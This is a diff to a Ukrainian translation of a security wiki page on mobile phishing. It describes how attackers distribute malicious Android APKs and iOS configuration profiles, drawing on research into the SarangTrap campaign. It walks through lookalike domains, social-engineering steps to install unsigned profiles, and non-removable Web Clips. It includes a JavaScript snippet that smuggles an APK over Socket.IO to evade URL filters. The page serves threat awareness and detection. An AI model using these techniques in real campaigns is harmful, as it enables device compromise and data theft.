@@ -1,51 +1,52 @@
-# Mobile Phishing & Malicious App Distribution (Android & iOS)
+# Mobile Phishing і поширення шкідливих застосунків (Android та iOS)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!INFO]
-> Ця сторінка описує techniques, які threat actors використовують для розповсюдження **malicious Android APKs** і **iOS mobile-configuration profiles** через phishing (SEO, social engineering, fake stores, dating apps тощо).
-> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), а також з інших публічних досліджень.<sup>[[1]](#references)</sup>
+> На цій сторінці описано методи, які зловмисники використовують для поширення **шкідливих Android APK** і **профілів конфігурації iOS** за допомогою phishing (SEO, соціальна інженерія, підроблені магазини, dating-застосунки тощо).
+> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), та інших відкритих досліджень.<sup>[[1]](#references)</sup>
 
-## Attack Flow
+## Схема атаки
 
-1. **SEO/Phishing Infrastructure**
-* Зареєструвати десятки схожих доменів (dating, cloud share, car service…).
-– Використовувати keywords місцевою мовою та emojis в елементі `<title>`, щоб підвищити позиції в Google.
-– Розмістити інструкції зі встановлення для *обох* Android (`.apk`) та iOS на одній landing page.
-2. **First Stage Download**
-* Android: пряме посилання на *unsigned* APK або APK із “third-party store”.
-* iOS: `itms-services://` або звичайне HTTPS-посилання на malicious **mobileconfig** profile (див. нижче).
-3. **Android Post-install Behaviour**
-* C2-gated execution, permission abuse, dropper bypasses, background collection та інші post-install malware behaviour описані на спеціальній сторінці Android Malware Post-Exploitation нижче.
-4. **iOS Delivery Technique**
-* Один **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб зарахувати пристрій до supervision, подібного до “MDM”.
-* Інструкції social engineering:
-1. Відкрити Settings ➜ *Profile downloaded*.
-2. Тричі натиснути *Install* (скриншоти на phishing page).
-3. Довіритися unsigned profile ➜ attacker отримує entitlement до *Contacts* і *Photo* без перевірки App Store.
-5. **iOS Web Clip Payload (phishing app icon)**
-* Payloads `com.apple.webClip.managed` можуть **закріпити phishing URL на Home Screen** за допомогою branded icon/label.
-* Web Clips можуть запускатися **на весь екран** (приховуючи UI браузера) і бути позначені як **non-removable**, змушуючи victim видалити profile, щоб прибрати icon.<sup>[[3]](#references)</sup>
-6. **Network Layer**
-* Звичайний HTTP, часто на port 80 із HOST header на кшталт `api.<phishingdomain>.com`.
-* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).
+1. **SEO/phishing-інфраструктура**
+   * Реєстрація десятків схожих доменів (dating, хмарний обмін файлами, автосервіс тощо).  
+     – Використання ключових слів місцевою мовою та emoji в елементі `<title>`, щоб покращити позицію в Google.  
+     – Розміщення інструкцій зі встановлення як для Android (`.apk`), так і для iOS на одній цільовій сторінці.
+2. **Завантаження першого етапу**
+   * Android: пряме посилання на *непідписаний* APK або APK із «стороннього магазину».  
+   * iOS: посилання `itms-services://` або звичайне HTTPS-посилання на шкідливий профіль **mobileconfig** (див. нижче).
+3. **Поведінка Android після встановлення**
+   * Виконання, контрольоване через C2, зловживання дозволами, обходи dropper, збір даних у фоновому режимі та інші способи поведінки шкідливого ПЗ після встановлення розглянуто на окремій сторінці Android Malware Post-Exploitation нижче.
+4. **Метод доставки для iOS**
+   * Один **профіль мобільної конфігурації** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб перевести пристрій під нагляд, подібний до «MDM».  
+   * Інструкції із соціальної інженерії:
+     1. Відкрити Settings ➜ *Profile downloaded*.
+     2. Тричі натиснути *Install* (скриншоти на phishing-сторінці).  
+     3. Довіритися непідписаному профілю ➜ зловмисник отримує права *Contacts* і *Photo* без перевірки App Store.
+5. **Корисне навантаження iOS Web Clip (значок phishing-застосунку)**
+   * Корисні навантаження `com.apple.webClip.managed` можуть **закріпити phishing URL на головному екрані** під брендованими значком і міткою.
+   * Web Clips можуть працювати **на весь екран** (приховуючи інтерфейс браузера) і бути позначені як **незнімні**, змушуючи жертву видалити профіль, щоб прибрати значок.<sup>[[3]](#references)</sup>
+6. **Мережевий рівень**
+   * Звичайний HTTP, часто на порту 80 із HOST-заголовком на кшталт `api.<phishingdomain>.com`.
+   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).
 
 ## Android Malware Post-Exploitation
 
-Щодо post-install Android malware tradecraft, зокрема C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS та persistence, дивіться:
+Про тактики Android-шкідливого ПЗ після встановлення, як-от C2, зловживання Accessibility, overlays, автоматизацію ATS, поетапне завантаження DEX, premium SMS і закріплення в системі, див.:
 
 {{#ref}}
 ../basic-forensic-methodology/android-malware-post-exploitation.md
 {{#endref}}
 
-## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
+## APK-smuggling через Socket.IO/WebSocket і підроблені сторінки Google Play
 
-Attackers дедалі частіше замінюють static APK links на Socket.IO/WebSocket channel, вбудований у lures, що імітують Google Play. Це приховує payload URL, обходить URL/extension filters і зберігає реалістичний install UX.<sup>[[2]](#references)[[4]](#references)</sup>
+Зловмисники дедалі частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у приманки, що імітують Google Play. Це приховує URL корисного навантаження, обходить фільтри URL/розширень і зберігає реалістичний процес встановлення.<sup>[[2]](#references)[[4]](#references)</sup>
 
-Типовий client flow, який спостерігався in the wild:
+Типовий потік клієнта, виявлений у реальних атаках:
 
 <details>
-<summary>Socket.IO fake Play downloader (JavaScript)</summary>
+<summary>Підроблений завантажувач Play через Socket.IO (JavaScript)</summary>
+
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -58,21 +59,22 @@ socket.on("downloadProgress", (p) => updateProgressBar(p));
 
 // Assemble APK client‑side and trigger browser save dialog
 socket.on("downloadComplete", () => {
-const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
-const url = URL.createObjectURL(blob);
-const a = document.createElement("a");
-a.href = url; a.download = "app.apk"; a.style.display = "none";
-document.body.appendChild(a); a.click();
+  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url; a.download = "app.apk"; a.style.display = "none";
+  document.body.appendChild(a); a.click();
 });
 ```
+
 </details>
 
 Чому це обходить прості засоби контролю:
-- Статична URL-адреса APK не розкривається; payload відновлюється в пам’яті з кадрів WebSocket.
-- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть пропустити бінарні дані, тунельовані через WebSocket/Socket.IO.
-- Краулери та URL-sandbox, які не виконують WebSocket, не отримають payload.
+- Статичну URL-адресу APK не розкрито; payload відновлюється в пам’яті з кадрів WebSocket.
+- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть не виявити двійкові дані, тунельовані через WebSockets/Socket.IO.
+- Crawler-и та URL-пісочниці, які не виконують WebSockets, не отримають payload.
 
-Див. також практики та інструменти WebSocket:
+Див. також WebSocket tradecraft та інструменти:
 
 {{#ref}}
 ../../pentesting-web/websocket-attacks.md
@@ -81,8 +83,8 @@ document.body.appendChild(a); a.click();
 
 ## References
 
-- [1] [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
+- [1] [Темний бік романтики: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [2] [Socket.IO](https://socket.io)
 - [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
-- [4] [Banker Trojan Targeting Indonesian and Vietnamese Android Users](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
+- [4] [Банківський троян, націлений на користувачів Android з Індонезії та В’єтнаму](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 {{#include ../../banners/hacktricks-training.md}}
